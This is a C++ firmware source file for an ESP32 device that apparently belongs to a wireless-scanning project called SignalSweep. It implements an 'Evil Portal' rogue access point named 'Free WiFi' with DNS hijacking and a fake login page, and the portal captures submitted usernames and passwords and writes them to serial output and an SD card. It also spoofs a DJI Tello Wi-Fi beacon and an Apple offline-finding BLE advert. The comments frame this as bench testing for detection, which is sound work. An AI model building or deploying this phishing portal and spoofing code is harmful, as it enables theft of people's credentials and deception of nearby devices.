// SPDX-License-Identifier: GPL-3.0-or-later
// tx_c6.cpp — see tx_c6.h. Opt-in build only (env c6touch_tx).
#include "tx_c6.h"
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <NimBLEDevice.h>
#include <esp_wifi.h>
#include "scan_c6/scan_c6.h"
#include "sd_log/sd_store.h"

// ── Evil Portal ────────────────────────────────────────────────────────────────
static const char* PORTAL_SSID = "Free WiFi";
static DNSServer  s_dns;
static WebServer   s_web(80);
static bool        s_portal_on = false;
static uint32_t    s_hits = 0;
static char        s_last[64] = "";

// Generic login page: this is a bench-test fixture for SignalSweep's own captive-portal detection, not a copy of
// any real provider's page, so it never impersonates a brand.
static const char PORTAL_HTML[] PROGMEM =
"<!doctype html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
"<title>Network Login</title><style>body{font-family:sans-serif;background:#111;color:#eee;padding:24px}"
"input{width:100%;padding:10px;margin:8px 0;font-size:16px;box-sizing:border-box}"
"button{width:100%;padding:12px;font-size:16px;background:#2a7;color:#fff;border:0;border-radius:4px}</style>"
"</head><body><h3>Sign in to continue</h3>"
"<form method=POST action=\"/login\">"
"<input name=u placeholder=\"Username\"><input name=p type=password placeholder=\"Password\">"
"<button>Continue</button></form></body></html>";

static void portal_log_req(const char* tag) {
    Serial.printf("[portal] %s: %s %s (host '%s', client %s)\n", tag, s_web.method() == HTTP_GET ? "GET" : "POST",
                  s_web.uri().c_str(), s_web.hostHeader().c_str(), s_web.client().remoteIP().toString().c_str());
}

static void portal_handle_root() { portal_log_req("root"); s_web.send(200, "text/html", PORTAL_HTML); }

static void portal_handle_login() {
    String u = s_web.arg("u"), p = s_web.arg("p");
    s_hits++;
    snprintf(s_last, sizeof(s_last), "%s / %s", u.c_str(), p.c_str());
    Serial.printf("[portal] capture #%u: %s\n", (unsigned)s_hits, s_last);
    char line[96];
    snprintf(line, sizeof(line), "[%lu] %s", (unsigned long)millis(), s_last);
    sd_append_line("/signalsweep/portal_log.txt", line);
    s_web.send(200, "text/html", "<!doctype html><body style='font-family:sans-serif;background:#111;color:#eee;padding:24px'><h3>Connected.</h3></body>");
}

// Every other path redirects to the login page, which is what makes it a *captive* portal to the OS's connectivity
// check (a probe to some outside URL gets this 302 instead of the plain-200 it expects, which most OSes read as
// "sign in to this network"). This only works for a probe made in plain HTTP; a probe or browser request made over
// HTTPS gets no response at all (port 443 isn't served here), which is the most common reason nothing appears.
static void portal_handle_any() { portal_log_req("redirect"); s_web.sendHeader("Location", "/", true); s_web.send(302, "text/plain", ""); }

bool tx_c6_portal_start() {
    if (s_portal_on) return true;
    scan_c6_suspend(true);
    WiFi.mode(WIFI_AP);
    bool ok = WiFi.softAP(PORTAL_SSID);
    s_dns.start(53, "*", WiFi.softAPIP());
    s_web.on("/", HTTP_GET, portal_handle_root);
    s_web.on("/login", HTTP_POST, portal_handle_login);
    s_web.onNotFound(portal_handle_any);
    s_web.begin();
    s_portal_on = true;
    s_hits = 0; s_last[0] = 0;
    Serial.printf("[portal] %s, AP '%s' at %s\n", ok ? "started" : "softAP FAILED", PORTAL_SSID, WiFi.softAPIP().toString().c_str());
    return ok;
}

void tx_c6_portal_stop() {
    if (!s_portal_on) return;
    s_web.stop();
    s_dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    s_portal_on = false;
    scan_c6_suspend(false);   // forces a clean re-init of the WiFi sweep (see scan_c6.cpp)
    Serial.println("[portal] stopped");
}

bool     tx_c6_portal_active() { return s_portal_on; }
uint32_t tx_c6_portal_hits()   { return s_hits; }
void     tx_c6_portal_last(char* out, size_t n) { snprintf(out, n, "%s", s_last); }

void tx_c6_portal_poll() {
    if (!s_portal_on) return;
    s_dns.processNextRequest();
    s_web.handleClient();
}

// ── Single-shot WiFi spoof: one real DJI-Tello-signature beacon ─────────────────
// Same fields as scan_c6_inject_demo('2') / inject_wifi_tello(), but built without the fake 4-byte FCS pad the
// software-injection path uses (that path feeds our own parser directly; a real radio frame must NOT include a
// trailing FCS — esp_wifi_80211_tx has the MAC hardware compute and append it).
void tx_c6_spoof_wifi_once() {
    scan_c6_suspend(true);
    esp_wifi_set_mode(WIFI_MODE_STA);   // unassociated STA mode is enough for esp_wifi_80211_tx
    esp_wifi_start();

    uint8_t f[96] = {0};
    int p = 0;
    f[p++] = 0x80; f[p++] = 0x00; p += 2;                                  // beacon, duration
    for (int i = 0; i < 6; i++) f[p++] = 0xFF;                             // addr1: broadcast
    static const uint8_t src[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x56};    // locally-administered, distinct from the demo MAC
    memcpy(&f[p], src, 6); p += 6;                                         // addr2
    memcpy(&f[p], src, 6); p += 6;                                         // addr3
    p += 2;                                                                // sequence
    p += 8;                                                                // timestamp
    f[p++] = 0x64; f[p++] = 0x00;                                          // beacon interval
    f[p++] = 0x01; f[p++] = 0x04;                                          // capabilities
    const char* ssid = "TELLO-TEST01";
    f[p++] = 0; f[p++] = (uint8_t)strlen(ssid); memcpy(&f[p], ssid, strlen(ssid)); p += (int)strlen(ssid);
    f[p++] = 1; f[p++] = 1; f[p++] = 0x82;                                 // rates
    f[p++] = 3; f[p++] = 1; f[p++] = 6;                                    // DS parameter set: channel 6

    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, f, p, false);
    Serial.printf("[spoof] WiFi beacon SSID '%s' (%d bytes): %s\n", ssid, p, e == ESP_OK ? "sent" : esp_err_to_name(e));

    esp_wifi_set_mode(WIFI_MODE_NULL);
    scan_c6_suspend(false);
}

// ── Single-shot BLE spoof: ~3 s of a real Apple offline-finding long-form advert ─
void tx_c6_spoof_ble_once() {
    scan_c6_suspend(true);

    uint8_t mfg[] = { 0x4C, 0x00, 0x12, 0x19, 0,0,0,0,0,0,0,0,0,0 };   // Apple, type 0x12, offline-finding long form
    NimBLEAdvertisementData adv;
    adv.setFlags(0x06);
    adv.setManufacturerData(std::string((char*)mfg, sizeof(mfg)));

    NimBLEAdvertising* advert = NimBLEDevice::getAdvertising();   // same singleton; the scan side never touches it
    advert->setAdvertisementData(adv);
    advert->start(3);   // seconds; NimBLE stops it for us when this expires
    Serial.println("[spoof] BLE advert (Apple 0x12/0x19 long form) sending for 3 s");

    delay(3200);
    scan_c6_suspend(false);
}

void tx_c6_init() {
    Serial.println("[tx] SS_TX_ENABLED build: Evil Portal and single-shot spoof are available (opt-in, bench-test only)");
}
